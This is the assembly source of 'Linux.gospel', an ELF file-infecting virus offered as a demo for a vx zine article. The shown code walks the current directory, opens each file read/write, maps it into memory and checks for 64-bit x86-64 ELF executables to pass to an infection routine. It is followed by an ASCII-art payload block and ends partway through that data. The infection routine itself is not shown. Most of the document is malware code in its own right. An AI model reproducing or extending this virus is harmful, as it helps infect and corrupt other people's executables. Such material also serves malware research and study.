BITS 64


;*******************************************************************************
; ********************
; Linux.gospel
; Written by ic3qu33n
; ********************
;
; gospel is a Linux virus that implements the text segment padding technique 
; created by Silvio Cesare (aka silvio) and documented in his articles 
; “UNIX viruses” [1] and “UNIX ELF Parasites and virus” [2].
; gospel is an ELF infector that adds its viral payload to the region 
; reserved for padding bytes between the .text segment and the .data segment. 
; It relies on the use of padding bytes between segments as a page-aligned 
; region of available memory.
;
;
; This demo virus is created as the accompaniment to my article 
; “u used 2 call me on my polymorphic shell phone, pt. 1:  
;  gospel for a new epoch”
; to be released in tmp.0ut volume 3.
;
; **********************
; Primary vx references
; **********************
; The primary vx resources that I referenced while writing this virus 
; are the following 
; (also listed with the same reference numbers in the References section 
; for consistency):
; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998  
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
;
;
; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; (navigate to it from this page; I’m not putting the link to the tarball 
; here so you don't accidentally download it. yw.)
;
; [13] “Skeksi virus,” elfmaster
; https://github.com/elfmaster/skeksi_virus 
;
;
; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
; https://tmpout.sh/1/Linux.Nasty.asm 
;
;
; ************************
; How to assemble gospel:
; ************************
;
;The Makefile in this repo can be used to assemble gospel.
; Alternatively, to assemble gospel, you will need
; i. nasm
; ii. an x86_64 GNU linker 
;
; Note: I used x86_64-linux-gnu-ld on an aarch64 Kali vm: 
; Debian 6.5.3-1kali1 (2023-09-19) aarch64 GNU/Linux
; This was a good option for me since I needed a cross-compiler 
; toolchain for my dev env, 
; but feel free to use your favorite compatible linker
;
; To assemble, use the following command:
;
; nasm -f elf64 gospel.asm -o gospel.o && x86_64-linux-gnu-ld gospel.o -o gospel
;
;
;
; ************************
; greetz <3
; ************************
; Everyone on the tmp.0ut team 
; Extra special shoutouts+thank yous to netspooky and sblip for all their support&feedback on this project! 
; Silvio (Silvio if you read this then, hello! I love your work!)
; elfmaster and TMZ for your amazing Linux vx
; Travisgoodspeed
; richinseattle, jduck, botvx, mrphrazer, lauriewired
; zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino, 0daysimpson
;
;
; Everyone in the slop pit and all my homies near + far
; ilysm xoxoxoxoxoxxo
;
;
; *********************************
; References:
; *********************************
; 
; [1] “Unix Viruses,” Silvio Cesare, 
; https://web.archive.org/web/20020604060624/http://www.big.net.au/~silvio/unix-viruses.txt  
; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998,
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
; 
; [3 — same as 1, different URL] “UNIX Viruses” Silvio Cesare, October 1998
; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm 
; 
; [4] “The VIT(Vit.4096) Virus,” Silvio Cesare, October 1998
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; 
; [4a]“VIT Virus: VIT description,” Silvio Cesare, October 1998
; https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
; 
; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
; (navigate to it from this page; I’m not putting the link to the tarball here 
; so u don't accidentally download it. yw.)
; 
; [5] “Shared Library Call Redirection via ELF PLT Infection”, Silvio Cesare, 
; Phrack, Volume 0xa Issue 0x38, 
; 05.01.2000, 0x07[0x10],  http://phrack.org/issues/56/7.html#article 
; 
; [6] “Getdents.old.att”
; Github: Jamichaels (sblip),
; https://gist.github.com/jamichaels/fd6bca66879da9ec0efe 
; 
; [7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
; 
; [8] “Linux virus writing tutorial” [v1.0 at xx/12/99], by mandragore, 
; from Feathered Serpents, 29A issue #4
; 
; [9] “Half virus: Linux.A.443,” Pavel Pech (aka TheKing1980), 03/02/2002, 
; 29A issue #6
; 
; [10] “Linux Mutation Engine (source code) [LiME] Version: 0.2.0,” 
; written by zhugejin at Taipei, Taiwan; 
; Date: 2000/10/10, Last update: 2001/02/28, 29A issue #6
; 
; [11] “Win32/Linux.Winux”, by Benny/29A, 29A issue #6
; 
; [12] “Metamorphism in practice or How I made MetaPHOR and what I've learnt”, 
; by The Mental Driller/29A, 29A issue #6
; 
; [13] “Skeksi virus,” elfmaster
; https://github.com/elfmaster/skeksi_virus 
; 
; 
; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
; https://tmpout.sh/1/Linux.Nasty.asm
; 
; [15] “Linux.Nasty.asm,” TMZ, 2021,
; https://www.guitmz.com/linux-nasty-elf-virus/ 
;  
;*******************************************************************************

section	.bss
	struc linuxdirent
		.d_ino:			resq	1
		.d_off:			resq	1
		.d_reclen:		resb	2
		.d_nameq:		resb	1
		.d_type:		resb	1
	endstruc
	
	struc filestat
		.st_dev			resq	1	;IDofdevcontainingfile
		.st_ino			resq	1	;inode#
		.st_mode		resd	1	;pn
		.st_nlink		resd	1	;#ofhardlinks
		.st_uid			resd	1	;useridofowner
		.st_gid			resd	1	;groupIdofowner
		.st_rdev		resq	1	;devID
		.st_pad1		resq	1	;padding
		.st_size		resd	1	;totalsizeinbytes
		.st_blksize		resq	1	;blocksizeforfsi/o
		.st_pad2		resd	1	;padding
		.st_blocks		resq	1	;#of512bblocksallocated
		.st_atime		resq	1	;timeoflastfileaccess
		.st_mtime		resq	1	;timeoflastfilemod
		.st_ctime		resq	1	;timeoflastfilestatuschange
	endstruc

	struc elf_ehdr
		.e_ident		resd	1		;unsignedchar
		.ei_class		resb	1		;
		.ei_data		resb	1		;
		.ei_version		resb	1		;
		.ei_osabi		resb	1		;
		.ei_abiversion	resb	1		;
		.ei_padding		resb	6		;bytes9-14
		.ei_nident		resb	1		;sizeofidentarray
		.e_type			resw	1		;uint16_t,bytes16-17
		.e_machine		resw	1		;uint16_t,bytes18-19
		.e_version		resd	1		;uint32_t, bytes 20-23
		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
		.e_flags		resd	1		;uint32_t, bytes 48-51
		.e_ehsize		resb	2		;uint16_t, bytes 52-53
		.e_phentsize	resb	2		;uint16_t, bytes 54-55
		.e_phnum		resb	2		;uint16_t, bytes 56-57
		.e_shentsize	resb	2		;uint16_t, bytes 58-59
		.e_shnum		resb	2		;uint16_t, bytes 60-61
		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
	endstruc

	struc elf_phdr
		.p_type			resd 1		;  uint32_t   
		.p_flags		resd 1		;  uint32_t   
		.p_offset		resq 1		;  Elf64_Off  
		.p_vaddr		resq 1		;  Elf64_Addr 
		.p_paddr		resq 1		;  Elf64_Addr 
		.p_filesz		resq 1		;  uint64_t   
		.p_memsz		resq 1		;  uint64_t   
		.p_align		resq 1		;  uint64_t   
	endstruc

	struc elf_shdr
    	.sh_name		resw 1		; uint32_t   
    	.sh_type		resw 1		; uint32_t   
    	.sh_flags		resq 1		; uint64_t   
    	.sh_addr		resq 1		; Elf64_Addr 
     	.sh_offset		resq 1		; Elf64_Off  
     	.sh_size		resq 1		; uint64_t   
     	.sh_link		resw 1		; uint32_t   
     	.sh_info		resw 1		; uint32_t   
     	.sh_addralign	resq 1		; uint64_t   
     	.sh_entsize		resq 1		; uint64_t   
	endstruc



section .data

;x64 syscall reference

SYS_READ 		equ 0x0
SYS_WRITE 		equ 0x1
SYS_OPEN 		equ 0x2
SYS_CLOSE 		equ 0x3
SYS_FSTAT 		equ 0x5
SYS_LSEEK 		equ 0x8
SYS_MMAP 		equ 0x9
SYS_MUNMAP		equ 0xB
SYS_PREAD64 	equ 0x11
SYS_PWRITE64 	equ 0x12
SYS_EXIT		equ 0x3c
SYS_GETDENTS64	equ 0x4e
SYS_CREAT		equ 0x55


PAGESIZE dd 4096	


teststr db 'boo', 13,10,0
teststrlen equ $-teststr

targetdir db '.',0
targetdirlen equ $-targetdir


;****************************************************************************************
; debug strings
;
;****************************************************************************************

checkelfpass db 'File is an ELF!', 13, 10, 0
checkelfpasslen equ $-checkelfpass

checkelffail db 'File is not an ELF!', 13, 10, 0
checkelffaillen equ $-checkelffail

checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
checkfiledtreg_fail_len equ $-checkfile_dtreg_fail

checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
checkelf_etype_faillen equ $-checkelf_etype_fail

check64pass db 'File is an ELFCLASS64!', 13, 10, 0
check64passlen equ $-check64pass
check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
check64faillen equ $-check64fail

checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
checkarchpasslen equ $-checkarchpass
checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
checkarchfaillen equ $-checkarchfail

checkphdrstart db 'Beginning of phdr_loop', 13,10,0
checkphdrstartlen equ $-checkphdrstart

checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
checkptloadpasslen equ $-checkptloadpass
checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
checkptloadfaillen equ $-checkptloadfail

textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
;****************************************************************************************

;variables used for phdr and shdr manipulation routines

evaddr: dq 0
oshoff: dq 0

hostentry_offset: dd 0
hosttext_start: dd 0

vxhostentry: dq 0
vxoffset: dq 0
ventry equ $_start 


fd:	dq 0


;fdlen equ $-fd
;framebuffer:
;	db `//dev//fb0`,0
;framebuflen equ $-framebuffer
;;

STDOUT			equ 0x1

;open() syscall parameter reference 
OPEN_RDWR		equ 0x2
O_WRONLY		equ 0x1
O_RDONLY		equ 0x0


O_CREAT			equ 100o
O_TRUNC			equ 1000o
O_APPEND		equ 2000o

SEEK_CUR 		equ 0x1

S_IFREG    		dq 0x0100000   ;regular file
S_IFMT 			dq 0x0170000

;mode 		dd 0
;S_ISREG		equ (mode & S_IFMT)
;;%define S_ISREG(x)	(x&S_IFMT==S_IFREG)
;%define S_ISREG(x)	x & S_IFMT
;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file


PROT_READ		equ 0x1
PROT_WRITE		equ 0x2
MAP_PRIVATE		equ 0x2

;ELF header vals
ELFCLASS64 		equ 0x2
ETYPE_DYN		equ 0x3
ETYPE_EXEC		equ 0x2
ELFX8664		equ 0x3e

;D_TYPE values
DT_REG 			equ 0x8

;PHDR vals
;PT_LOAD 	dd 1
PT_LOAD 	equ 0x1

MAX_RDENT_BUF	times 0x800 db 0 
MAX_RDENT_BUF_SIZE equ 0x800

;num_dir_entries resq 0x0
;root_dirent:	dq 0 

;;file pointed to by fstat is fd


section .text
global _start
_start:
	push rbp
	mov rbp, rsp
	sub rsp, 0x1000
	mov r14, rsp

_getdirents:
;****************************************************************************************
; open - syscall 0x2
;;open(filename, flags, mode);
;;rdi == filename
;;rsi == flags
;rdx == mode
;; returns: fd (in rax, obv)
;****************************************************************************************
	mov rdi, targetdir
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, O_RDONLY	;open read-only
	mov rax, SYS_OPEN
	syscall
	
	mov r9, rax						;fd into r9
;****************************************************************************************
; getdents64 - syscall 0x4e
;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;rdi == fd
;;rsi == *dirent
;rdx == count
;returns # entries in rax
;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
;so we can iterate through all dirent entries using the size field in this dirent struc
;as an offset for successive jumps in address space	
;****************************************************************************************
	mov rdi, rax
	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
	mov rdx, MAX_RDENT_BUF_SIZE
	mov rax, SYS_GETDENTS64
	syscall


	mov r8, rax						;save # of dirent entries in r8
	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
;****************************************************************************************
; close - syscall 0x3
;;close(fd);
;;rdi == fd (file descriptor)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall
	
	xor rcx, rcx	
	jmp check_file
	
;****************************************************************************************
; write - syscall 0x1
;;rdi == fd (file descriptor)
;;rsi == const char* buf
;rdx == count (# of bytes to write)
;; returns: 0 on success (-1 on error)
;
;	these routines are used for the bulk of the debug string printing
;
;****************************************************************************************
;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
;	lea rdi, [r14 + 200] 
;	test_copy_filename:
;		movsb
;		cmp byte [rsi], 0x0
;		jne test_copy_filename
;	lea r13, [r14 + 200]
;	call _write

_write:
		xor rsi, rsi
		mov rdx, r12
		mov rsi, r13
		mov rdi, STDOUT
		mov rax, SYS_WRITE
		syscall
		ret
	
printteststr:
		lea rsi, teststr
		mov rdi, STDOUT
		mov rdx, teststrlen
		mov rax, SYS_WRITE
		syscall
		jmp _restore		

;****************************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
;****************************************************************************************
check_file:
	push rcx
	;nvm d_type might not be available; use the macros for fstat instead
	check_elf:
		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
		xor rdx, rdx						;mode - 0
		mov rax, SYS_OPEN
		syscall

		cmp rax, 0
		jb checknext
		
		mov r9, rax
		mov r8, rax
		mov [r14 + 144], rax
		;mov [fd], rax
		
		xor r12, r12
		lea rdi, [r14 + 200] 
		lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
		.copy_filename:
			movsb
			inc r12
			cmp byte [rsi], 0x0
			jne .copy_filename

		;debug print check
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		;lea r13, [r14 + 200]
		;call _write
		xor rax, rax
		push r9
	check_filename:
		cmp qword [r14+200], "."
		je checknext

	get_filestat:
									;size for mmap == e_shoff + (e_shnum * e_shentsize)
		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
		mov rdi, r8
		mov rax, SYS_FSTAT
		syscall

		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
		; since this is so annoying, I'm skipping this check for rn
		;mov r10, [r14 + file_stat.st_mode]
		;mov [mode], r10
		;mov r10, S_ISREG(r10)
		;cmp S_ISREG, S_IFREG	
		;cmp r10, 0x1
		;mov rax, [r14+file_stat.st_mode]
		;and r10, [S_IFMT]
		;mov r9, [S_IFREG]
		;cmp r10, r9
		;jne checknext
	

	
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int fd, off_t offset);
	mmap_file:
		xor rdi, rdi			;set RDI to NULL
		mov rsi, [r14 + filestat.st_size]
		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
		mov r10, MAP_PRIVATE
		;mov r8, fd				;fd is already in r8 so we don't need to set that reg again
		xor r9, r9				;offset of 0 within file == start of file, obv	
		mov rax, SYS_MMAP
		syscall
		
		cmp rax, 0
		jb checknext
		pop r9
	
		mov r8, rax
		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
		push rax

	close_curr_file:
		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall
	
		pop rax
		test rax, rax
		js checknext
	check_elf_header_etype:
		lea r13, checkelf_etype_fail
		mov r12, checkelf_etype_faillen
		cmp word [rax + elf_ehdr.e_type], 0x0002
		je check_elf_header_magic_bytes
		cmp word [rax + elf_ehdr.e_type], 0x0003
		je check_elf_header_magic_bytes
		jnz checknext

	check_elf_header_magic_bytes:
		;debug print check
		;lea r13, checkelffail
		;mov r12, checkelffaillen
		
		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
		jnz checknext
		
		;debug print check
;		lea r13, checkelfpass
;		mov r12, checkelfpasslen
;		call _write
	
	check_elf_header_64bit:
		;debug print check
		;lea r13, check64fail
		;mov r12, check64faillen
		cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
		jne checknext
		
		;debug print check
		;lea r13, check64pass
		;mov r12, check64passlen
		;call _write
		;jmp ready2infect
	
	check_elf_header_arch:
		lea r13, checkarchfail
		mov r12, checkarchfaillen
		;cmp byte [r14+800+elf_ehdr + 18], ELFX8664
		cmp byte [rax + elf_ehdr.e_machine], 0x3e
		jne checknext
		
		;debug print check
		;lea r13, checkarchpass
		;mov r12, checkarchpasslen
		;call _write
		
	ready2infect:
		call infect	
		jmp painting

	checknext:
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		call _write
		
		mov rdi, fd
		mov rsi, [r14 + filestat.st_size]
		mov rax, SYS_MUNMAP
		syscall
		
		pop rcx
		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
		cmp qword rcx, [r14 + 500]
		jne check_file
		jmp _restore



	painting:
	call payload
		db 0x2a,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x25
		db 0xa,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a
		db 0x2a,0xa,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x2a
		db 0x2a,0x2a,0xa,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50
		db 0x50,0x50,0x50,0xa,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x2b,0x50,0x50,0x50,0x2b,0x2b,0x59,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b
		db 0x2b,0x2b,0x50,0x50,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x2a,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b
		db 0x2b,0x2b,0x2b,0x2b,0x2b,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x50,0x50,0x50,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59
		db 0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2b,0x50,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24
		db 0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2b,0x25,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x2a,0x2a,0x2b,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x2c,0x24,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2a,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x25,0x2a,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x24,0x50,0x2b,0x59,0x59,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x2b,0x59,0x24,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x25,0x44,0x44,0x2a,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x2c,0x24,0x24,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x59,0x2b,0x44,0x25,0x25,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x25,0x25,0x50,0x2b,0x24,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2b,0x50,0x2b,0x59,0x24,0x59,0x50,0x59,0x2c,0x2c,0x2c,0x59
		db 0x59,0x50,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x24,0x2c,0x2e,0x2c,0x59,0x2b,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x24,0x2c,0x2b,0x24,0x24,0x2c,0x2c,0x59,0x50,0x2b,0x59
		db 0x2b,0x2b,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x2a,0x2b,0x24,0x59,0x2b,0x59,0x59,0x24,0x24,0x24,0x59
